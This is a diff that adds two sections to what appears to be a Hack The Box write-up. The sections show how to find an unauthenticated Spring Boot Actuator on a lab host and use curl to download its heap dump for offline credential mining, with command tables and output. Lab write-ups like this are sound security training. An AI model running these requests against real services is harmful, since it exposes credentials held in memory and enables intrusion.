@@ -316,6 +316,81 @@ Connection: keep-alive
 ```
 
 Key finding: a `terminal-edge-gateway` whose JSON shape, capitalized `UP` states, and version/node/region layout are characteristic of Spring Boot. That framework ships Actuator management endpoints which, left unauthenticated, expose diagnostics including a full heap dump.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 2.2 Spring Boot Actuator Heap Dump
+
+The gateway is Spring Boot, so test whether its Actuator management endpoints were left exposed. One of them, the heap dump, serializes the whole JVM memory to disk, where connection-pool credentials sit in cleartext.
+
+#### 2.2.1 Enumerate the Actuator endpoint index
+
+Request the Actuator root. If management endpoints are unauthenticated, the index lists every one it will serve, which tells you what is reachable without a login.
+
+**Command:** `curl -s http://api.htb-airport.htb/actuator | jq .`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `curl -s` | HTTP client, silent | Fetches the Actuator index quietly. |
+| `/actuator` | Management root | Spring Boot's management index, which enumerates the exposed management endpoints as links. |
+| `\| jq .` | Pretty-print JSON | Renders the `_links` map so each available endpoint is readable. |
+
+**Result:**
+
+```shell
+{
+  "_links": {
+    "self": {
+      "href": "http://api.htb-airport.htb/actuator",
+      "templated": false
+    },
+    "heapdump": {
+      "href": "http://api.htb-airport.htb/actuator/heapdump",
+      "templated": false
+    }
+  }
+}
+```
+
+Key finding: the index is served with no authentication and exposes `heapdump`. That single endpoint is enough, so there is no need to probe further management routes.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 2.2.2 Download the heap dump
+
+Pull the heap dump to disk. It is a binary HPROF snapshot of live JVM memory, which is where the gateway's database credentials are held as objects.
+
+**Command:** `curl -s http://api.htb-airport.htb/actuator/heapdump -o stream.hprof; ls -lh stream.hprof; file stream.hprof`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `curl -s .../heapdump` | Fetch the dump | Downloads the heap snapshot from the exposed endpoint. |
+| `-o stream.hprof` | Save to file | Writes the binary body to a local file instead of the terminal. |
+| `ls -lh stream.hprof` | Confirm size | Shows the file exists and how large it is (tens of MB is normal). |
+| `file stream.hprof` | Confirm type | Verifies it is a genuine Java HPROF dump, not an error page saved by mistake. |
+
+**Result:**
+
+```shell
+-rw-rw-r-- 1 nedmoeca nedmoeca 45M Oct 17 11:09 stream.hprof
+stream.hprof: Java HPROF dump, created Sat Oct 17 15:09:10 2026
+```
+
+Key finding: a valid 45 MB HPROF dump of the running gateway. Everything the application holds in memory, credentials included, is now available offline for mining.
+
 
 
 
